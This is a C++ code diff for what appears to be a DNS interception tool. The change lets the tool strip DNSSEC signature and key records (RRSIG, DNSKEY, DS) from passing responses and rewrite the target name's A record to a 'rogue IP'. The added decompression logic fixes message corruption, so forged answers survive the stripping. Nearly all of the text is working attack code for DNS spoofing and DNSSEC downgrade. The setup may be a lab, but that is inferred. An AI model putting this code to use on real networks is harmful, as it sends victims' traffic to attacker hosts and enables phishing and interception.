@@ -302,15 +302,107 @@ void resolver_mac_refresher(std::string iface, std::string resolver_ip) {
 
 // ---------- strip-mode RR filtering ----------
 
+constexpr uint16_t DNS_TYPE_NS    = 2;
+constexpr uint16_t DNS_TYPE_CNAME = 5;
+constexpr uint16_t DNS_TYPE_SOA   = 6;
+constexpr uint16_t DNS_TYPE_PTR   = 12;
+
+// Fully expands a (possibly compressed) domain name at `offset` in the
+// ORIGINAL message into its uncompressed wire form (labels verbatim,
+// pointers followed and replaced by the labels they point to, ending
+// in the root 0 byte), appending it to `out`. Returns the number of
+// bytes consumed IN THE ORIGINAL MESSAGE starting at `offset` (same
+// contract as dns_name_len: up to and including a pointer, 2 bytes,
+// if one was followed), or -1 if malformed or a pointer loop is
+// detected.
+//
+// Why this exists at all: a removed RRSIG's RDATA contains its
+// zone's name written out in full (DNSSEC requires that field
+// uncompressed) -- which makes it a perfectly legal compression
+// target for any OTHER name in the same message that happens to need
+// that same suffix (e.g. an NS record's rdata "host.example.com").
+// Copying such a later record's bytes verbatim after deleting the
+// RRSIG it secretly pointed into corrupts the message; decompressing
+// every name into a self-contained form before writing it out removes
+// the dependency entirely, regardless of what gets stripped around it.
+int decompress_name_append(const uint8_t *dns_start, int offset, int dns_len,
+                            std::vector<uint8_t> &out) {
+    const int start = offset;
+    bool following_pointer = false;
+    int consumed_to_first_pointer = -1;
+    int hops = 0;
+    while (true) {
+        if (offset < 0 || offset >= dns_len) return -1;
+        const uint8_t b = dns_start[offset];
+        if ((b & 0xC0) == 0xC0) {
+            if (offset + 2 > dns_len) return -1;
+            const int target = ((b & 0x3F) << 8) | dns_start[offset + 1];
+            if (!following_pointer) consumed_to_first_pointer = (offset - start) + 2;
+            if (++hops > 128) return -1; // pointer-loop guard
+            offset = target;
+            following_pointer = true;
+            continue;
+        } else if (b == 0) {
+            out.push_back(0);
+            return following_pointer ? consumed_to_first_pointer : (offset - start + 1);
+        } else if ((b & 0xC0) == 0) {
+            if (offset + 1 + b > dns_len) return -1;
+            out.insert(out.end(), dns_start + offset, dns_start + offset + 1 + b);
+            offset += 1 + b;
+        } else {
+            return -1;
+        }
+    }
+}
+
+// Writes the (possibly re-expanded) RDATA for one kept record into
+// `out`, given its original bytes. For record types whose RDATA
+// itself contains a domain name that could be compressed (NS/CNAME/
+// PTR: one name; SOA: two names followed by five 32-bit fields),
+// that name is decompressed the same way the owner name is. Every
+// other type (A, OPT, and anything else we don't specifically
+// recognize) is copied byte-for-byte -- safe, because none of the
+// types this interceptor ever sees in practice (A, OPT) embed a
+// compressible name in their RDATA. Returns false on a parse failure.
+bool append_rdata(const uint8_t *dns_start, int rdata_off, uint16_t rdlen, int dns_len,
+                   uint16_t rtype, std::vector<uint8_t> &out) {
+    if (rtype == DNS_TYPE_NS || rtype == DNS_TYPE_CNAME || rtype == DNS_TYPE_PTR) {
+        std::vector<uint8_t> name;
+        if (decompress_name_append(dns_start, rdata_off, dns_len, name) < 0) return false;
+        out.insert(out.end(), name.begin(), name.end());
+        return true;
+    }
+    if (rtype == DNS_TYPE_SOA) {
+        std::vector<uint8_t> mname, rname;
+        const int mconsumed = decompress_name_append(dns_start, rdata_off, dns_len, mname);
+        if (mconsumed < 0) return false;
+        const int rname_off = rdata_off + mconsumed;
+        const int rconsumed = decompress_name_append(dns_start, rname_off, dns_len, rname);
+        if (rconsumed < 0) return false;
+        const int tail_off = rname_off + rconsumed;
+        if (tail_off + 20 > dns_len) return false; // serial/refresh/retry/expire/minimum
+        out.insert(out.end(), mname.begin(), mname.end());
+        out.insert(out.end(), rname.begin(), rname.end());
+        out.insert(out.end(), dns_start + tail_off, dns_start + tail_off + 20);
+        return true;
+    }
+    // Opaque RDATA (A, OPT, ...): copy verbatim, no names inside to fix up.
+    if (rdata_off + static_cast<int>(rdlen) > dns_len) return false;
+    out.insert(out.end(), dns_start + rdata_off, dns_start + rdata_off + rdlen);
+    return true;
+}
+
 // Walks `count` resource records starting at `offset` in the original
 // message (dns_start/dns_len), appending every record EXCEPT RRSIG/
-// DNSKEY/DS to `out` verbatim -- except that, when `forge_answers` is
-// set (answer section of a response whose question is the target
-// name), any A record's RDATA is overwritten with the rogue IP as it's
-// copied. Returns {new record count, next offset in the ORIGINAL
-// message, success}; on any parse failure the caller aborts the strip
-// and falls back to relaying the packet completely unmodified, so a
-// malformed/unexpected message never gets corrupted further.
+// DNSKEY/DS to `out` with both its owner name and (where applicable)
+// any name embedded in its RDATA fully decompressed -- except that,
+// when `forge_answers` is set (answer section of a response whose
+// question is the target name), any A record's RDATA is overwritten
+// with the rogue IP as it's appended. Returns {new record count, next
+// offset in the ORIGINAL message, success}; on any parse failure the
+// caller aborts the strip and falls back to relaying the packet
+// completely unmodified, so a malformed/unexpected message never gets
+// corrupted further.
 struct SectionResult { int new_count; int next_offset; bool ok; };
 
 SectionResult strip_copy_section(const uint8_t *dns_start, int offset, int count, int dns_len,
@@ -335,10 +427,24 @@ SectionResult strip_copy_section(const uint8_t *dns_start, int offset, int count
             fprintf(stderr, "[strip] removed type=%u owner=%s (txid 0x%04x)\n",
                     rtype, qname_lower.c_str(), ntohs(txid));
         } else {
-            const size_t base = out.size();
-            out.insert(out.end(), dns_start + offset, dns_start + offset + rr_total);
-            if (forge_answers && !forged_once && rtype == DNS_TYPE_A && rclass == 1 && rdlen == 4) {
-                std::memcpy(out.data() + base + (rdata_off - offset), &g_rogue_ip_net, 4);
+            std::vector<uint8_t> owner;
+            if (decompress_name_append(dns_start, offset, dns_len, owner) < 0) return {kept, offset, false};
+            std::vector<uint8_t> rdata;
+            if (!append_rdata(dns_start, rdata_off, rdlen, dns_len, rtype, rdata)) return {kept, offset, false};
+
+            out.insert(out.end(), owner.begin(), owner.end());
+            uint16_t type_n = htons(rtype), class_n = htons(rclass);
+            uint32_t ttl_n; std::memcpy(&ttl_n, dns_start + rhdr + 4, 4); // already network order
+            uint16_t newlen_n = htons(static_cast<uint16_t>(rdata.size()));
+            out.insert(out.end(), reinterpret_cast<uint8_t*>(&type_n), reinterpret_cast<uint8_t*>(&type_n) + 2);
+            out.insert(out.end(), reinterpret_cast<uint8_t*>(&class_n), reinterpret_cast<uint8_t*>(&class_n) + 2);
+            out.insert(out.end(), reinterpret_cast<uint8_t*>(&ttl_n), reinterpret_cast<uint8_t*>(&ttl_n) + 4);
+            out.insert(out.end(), reinterpret_cast<uint8_t*>(&newlen_n), reinterpret_cast<uint8_t*>(&newlen_n) + 2);
+            const size_t rdata_base = out.size();
+            out.insert(out.end(), rdata.begin(), rdata.end());
+
+            if (forge_answers && !forged_once && rtype == DNS_TYPE_A && rclass == 1 && rdata.size() == 4) {
+                std::memcpy(out.data() + rdata_base, &g_rogue_ip_net, 4);
                 forged_once = true;
                 fprintf(stderr, "[strip+forge] %s A -> rogue-web (txid 0x%04x)\n",
                         qname_lower.c_str(), ntohs(txid));
